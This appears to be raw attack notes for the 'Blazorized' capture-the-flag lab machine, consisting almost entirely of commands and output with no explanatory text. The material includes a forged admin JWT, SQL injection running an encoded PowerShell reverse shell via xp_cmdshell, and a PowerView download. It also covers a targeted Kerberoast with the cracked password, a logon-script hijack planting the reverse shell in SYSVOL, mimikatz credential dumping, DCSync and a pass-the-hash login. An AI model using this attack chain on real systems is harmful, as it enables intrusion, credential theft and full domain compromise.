@@ -1,0 +1,176 @@
+└─$ nmap -A 10.10.11.22 -p 1-65535 -T5                                                                                            
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-29 23:02 CEST
+Nmap scan report for 10.10.11.22
+Host is up (0.050s latency).
+Not shown: 65510 closed tcp ports (conn-refused)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: Did not follow redirect to http://blazorized.htb
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-29 21:02:31Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1115.00; RC0+
+|_ssl-date: 2024-06-29T21:03:28+00:00; -1s from scanner time.
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2024-06-29T19:01:13
+|_Not valid after:  2054-06-29T19:01:13
+| ms-sql-info: 
+|   10.10.11.22\BLAZORIZED: 
+|     Instance name: BLAZORIZED
+|     Version: 
+|       name: Microsoft SQL Server 2022 RC0+
+|       number: 16.00.1115.00
+|       Product: Microsoft SQL Server 2022
+|       Service pack level: RC0
+|       Post-SP patches applied: true
+|     TCP port: 1433
+|_    Clustered: false
+| ms-sql-ntlm-info: 
+|   10.10.11.22\BLAZORIZED: 
+|     Target_Name: BLAZORIZED
+|     NetBIOS_Domain_Name: BLAZORIZED
+|     NetBIOS_Computer_Name: DC1
+|     DNS_Domain_Name: blazorized.htb
+|     DNS_Computer_Name: DC1.blazorized.htb
+|     DNS_Tree_Name: blazorized.htb
+|_    Product_Version: 10.0.17763
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49671/tcp open  msrpc         Microsoft Windows RPC
+49672/tcp open  msrpc         Microsoft Windows RPC
+49678/tcp open  msrpc         Microsoft Windows RPC
+49774/tcp open  msrpc         Microsoft Windows RPC
+49776/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1115.00; RC0+
+| ms-sql-info: 
+|   10.10.11.22:49776: 
+|     Version: 
+|       name: Microsoft SQL Server 2022 RC0+
+|       number: 16.00.1115.00
+|       Product: Microsoft SQL Server 2022
+|       Service pack level: RC0
+|       Post-SP patches applied: true
+|_    TCP port: 49776
+| ms-sql-ntlm-info: 
+|   10.10.11.22:49776: 
+|     Target_Name: BLAZORIZED
+|     NetBIOS_Domain_Name: BLAZORIZED
+|     NetBIOS_Computer_Name: DC1
+|     DNS_Domain_Name: blazorized.htb
+|     DNS_Computer_Name: DC1.blazorized.htb
+|     DNS_Tree_Name: blazorized.htb
+|_    Product_Version: 10.0.17763
+|_ssl-date: 2024-06-29T21:03:28+00:00; -1s from scanner time.
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2024-06-29T19:01:13
+|_Not valid after:  2054-06-29T19:01:13
+Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2024-06-29T21:03:21
+|_  start_date: N/A
+
+
+
+superadmin@blazorized.htb
+
+GET /_framework/blazor.boot.json
+
+Blazorized.Helpers.dll
+
+    private const long EXPIRATION_DURATION_IN_SECONDS = 60;
+    private static readonly string jwtSymmetricSecurityKey = "8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d9176ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadfca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac51742c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f595712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a";
+    private static readonly string superAdminEmailClaimValue = "superadmin@blazorized.htb";
+    private static readonly string postsPermissionsClaimValue = "Posts_Get_All";
+    private static readonly string categoriesPermissionsClaimValue = "Categories_Get_All";
+    private static readonly string superAdminRoleClaimValue = "Super_Admin";
+    private static readonly string issuer = "http://api.blazorized.htb";
+    private static readonly string apiAudience = "http://api.blazorized.htb";
+    private static readonly string adminDashboardAudience = "http://admin.blazorized.htb";
+
+
+
+localStorage.setItem('jwt','eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlN1cGVyX0FkbWluIl0sImV4cCI6MTcyOTc5MTk5MiwiaXNzIjoiaHR0cDovL2FwaS5ibGF6b3JpemVkLmh0YiIsImF1ZCI6Imh0dHA6Ly9hZG1pbi5ibGF6b3JpemVkLmh0YiJ9.LuYbakymh9QSjZt9-GeDNmN1Bzo0h0U_pKDF1wqLtLt4WxYAXnT4hTtGyUkwMGluCvd8Qy1hck5iMleT3fjW_Q')
+
+"aa' OR 1=1 OR '1'='1";"aa' OR 1=1 OR '1'='1"
+"aa' OR 1=1 OR '1'='1";"aa' OR 1=1 OR '1'='1"; 
+
+
+
+'; IF (SELECT CONVERT(INT, value_in_use) FROM sys.configurations WHERE name = 'xp_cmdshell') = 1 EXEC master.dbo.xp_cmdshell 'powershell -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=" '-- -
+
+???????????? Ever logged users
+    NT SERVICE\SQLTELEMETRY$BLAZORIZED
+    NT SERVICE\MSSQL$BLAZORIZED
+    BLAZORIZED\Administrator
+    BLAZORIZED\SSA_6010
+    BLAZORIZED\NU_1055
+    BLAZORIZED\RSA_4810
+
+PS C:\inetpub\wwwroot\blazorized.api> cat appsettings.json 
+{
+  "ConnectionStrings": {
+    "SQLServer": "Server=localhost\\BLAZORIZED;Database=Blazorized;User ID=API_LOGIN;Password=23!xd6fccd36sdf5b46!a0eca3d_a98f86fa2acvb9454er8a0580fdfwe59!6ce420918_;Trusted_Connection=False;TrustServerCertificate=true;"
+  },
+  "JWT": {
+    "Key": "8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d9176ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadfca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac51742c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f595712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a",
+    "Issuer": "http://api.blazorized.htb",
+    "Audience": "http://api.blazorized.htb"
+  },
+  "AllowedHosts": "*"
+}
+impacket-mssqlclient API_LOGIN:23!xd6fccd36sdf5b46!a0eca3d_a98f86fa2acvb9454er8a0580fdfwe59!6ce420918_@10.10.11.21
+
+PS C:\users\nu_1055> iwr -uri http://10.10.14.5/PowerView.ps1 -outfile powerview.ps1
+PS C:\users\nu_1055> Import-Module ./powerview.ps1
+
+
+
+
+get-aduser rsa_4810 -property * | select ServicePrincipalNames
+
+Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
+(Get-DomainSPNTicket -SPN nonexistent/BLAHBLAH).Hash
+
+
+$krb5tgs$23$*UNKNOWN$UNKNOWN$nonexistent/BLAHBLAH*$d8e589be3a619201065fc7aed8466037$8c10b4b9062b0aae3922348268e949d7e3501aa3cca567278f10ef38f7b60da166c6ffb675d6ad48d1e11c274207ff6973c24f0b7d6fce35a3a9bc6cc6d6fb48e3c4bf7ddeea6b211f9c8a3795397533255847eb9af944515f8a94874e9bbd92666890037f20956767149ce2985ea4f7906e49a634b1ca9aa2d4d56b10c3b56ad513d7d2ece8d72582bbbb90ec7c3335eaef0840f994e91c7d1b0c4c99e74274ff45680ad116435c93788eadabe15a7dca23703d80282fbdabad652f92e7f78304e70c2bab34e8e74932b65e77f35363ec506a696977f2736297535dd483d20565c6295504c78a9df21a995fbaba74330fb962ff199d2b484ee32a824f639424847edc6340f3066d16501fc722558f1f9f3bb5c4d07fecd8c1bce6805f64a60c2299a4d5fa899e271388604fbfe4600ca55be2a29c68af0b31748f021dd960552b2798e2eb66be277e13c4763161dba6cb7eb04ad1aac48c636307c60bf898a7315d1dab33e463b8045fff3d55e295c0a351d87abce138969acd11751761e0c3b59ef15ca7b7cc69780c5f1a39bef5319edad215a081b03e913c23fb801ce21b75c77c4e45d1c9e59492371fd000e73cdbb37c0fbe179a4161d16d993d01f603e83c0eb29a25a17fdeea48145060a7ce35fbb6f80d107e145ae3e451196a431957f0763e7043ffa74bdb9a0f025ff52f126c86794643d0d1f825a5a15fd3c6042b612369ddea2bc77f58a6076c96cbbb69f60acad0f523c112924db71a1fdf6d165e9e90d69c634937f284852aff33fb4a3ed0bb8bd729058f7675056036fbc0290df5c40d1a97f80da2b49cddb61f214d505bf20dacd90e00f0dddf37574417f10db85d7bd902bedad07911ee4eb6955beba5e79fdf6f632d1fd6cc86bf18df86eb9d8f32cb9d6f9cf086fdf96def1552359a0e8ad44fed700203c043c7ccd8802c46dfdcb2d7eb2ca3896999c4c48bd04ebf19ace94e7448a1dfab7eb964a2df9bbd021305f7a77e83834601864113bdf306a91d374533a38391aae0ff6e23ad109af6a8553624ef996adc373425e355f9d06d756824d99ec2ccd37219ace3c26d20045b12a6a632800c7feb51ed728b4a5cc729c46a2a65ffaa6d89ccbd9a139bb82c313de49dc275d804c4dc686f04149177d4438f1ed3c060c16b5c3707545f2702676ef5871ea1d62c3a5b60a4e8452714a60f01f5975810fb82e59e75287936bacc5bcfa032c08bd19e1a4bbe1804ce9b3ca41842fce360f505971b56a39ae9dea0fd6cf15362e27c60ee4ceca0a1e852e08f4b0330fd863219d1ecb8e897ebdca70c19081db5334bad9344c9c3dd90d07094b9fcee3e18efc92fe1cbc39015e0e5b0a53ea5f348a6513a9e4a3617d179a875d1a026b50c07d5eac6978f2fe58999c66e9637e1ae2d9a1ceecaeaa6773def2b48492b094e224af2e74b1a46b18416737b0a41162646a375b5c3eef6a0df320ef2ba97fbc6632d624a6cc1e9237d05dfb750cca45dcff679aa460cfe3341553fb5e59a71d6ef24ddf2f88414b906695330231c2cbf0e2987e0722670271a67a82d4bbdca0cae8519604ce84e34d008a931193e7346dc638a322a70c2ee84795cbf2b336fc022ebf6219fc3ec8b6c3957870eef1166bc0722d455a2084f524fd5418ccf7324b6bdc8fc0673eb3abd389e5bd92cfd3ecce8b65199626d0acc79e60c35adfdb9ae18f15210301af3fc6ceae372082a53b7236e2c3b17fcdb96afb6b5bf1613a4d99b2397952d2f0e19295388af:(Ni7856Do9854Ki05Ng0005 #)
+
+evil-winrm -i 10.10.11.22 -u RSA_4810 -p "(Ni7856Do9854Ki05Ng0005 #)" 
+
+get-childitem -r -filter *.bat -path C:\Windows\SYSVOL\domain\scripts\ -erroraction 'silentlycontinue' | ? Length -gt 0 
+
+
+Set-ADUser -Identity 'SSA_6010' -ScriptPath 'A32FF3AEAA23\login.bat'
+
+
+
+'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA='| Out-File -FilePath C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\login.bat -Encoding ASCII
+
+./mimi.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" 
+
+
+./mimi.exe "lsadump::dcsync /domain:blazorized.htb /user:Administrator " "exit" 
+
+evil-winrm -i 10.10.11.22 -u 'administrator -H'f55ed1465179ba374ec1cad05b34a5f3'
+
